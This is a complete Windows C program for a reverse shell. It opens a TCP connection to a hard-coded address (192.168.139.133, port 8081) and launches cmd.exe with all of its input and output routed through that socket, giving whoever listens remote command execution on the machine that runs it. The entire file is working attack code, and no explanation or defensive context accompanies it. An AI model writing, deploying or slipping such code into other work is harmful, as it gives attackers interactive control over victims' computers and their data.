#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

int main()
{
  SOCKET shell;
  sockaddr_in shell_addr;
  WSADATA wsa;
  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  char RecvServer[512];
  int connection;
  char ip_addr[] = "192.168.139.133";
  int port = 8081;
  WCHAR CmdProcess[] = L"C:\\WINDOWS\\System32\\cmd.exe";

  WSAStartup(MAKEWORD(2, 2), &wsa);                                                                   // Initialize Winsock
  shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); // Create a tcp socket

  shell_addr.sin_port = htons(port);
  shell_addr.sin_family = AF_INET;
  shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

  connection = WSAConnect(shell, (SOCKADDR *)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); // Connect to the target server

  if (connection == SOCKET_ERROR)
  {
    printf("[!] Connection to the target server failed. Please try again!\n");
    exit(0);
  }
  else
  {
    printf("[!] Connection to target server successful!\n");
    recv(shell, RecvServer, sizeof(RecvServer), 0);
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;                 // Pipe std input/output/err to the socket
    CreateProcessW(NULL, CmdProcess, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // Spawn Command Prompt process
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    memset(RecvServer, 0, sizeof(RecvServer));
  }
}
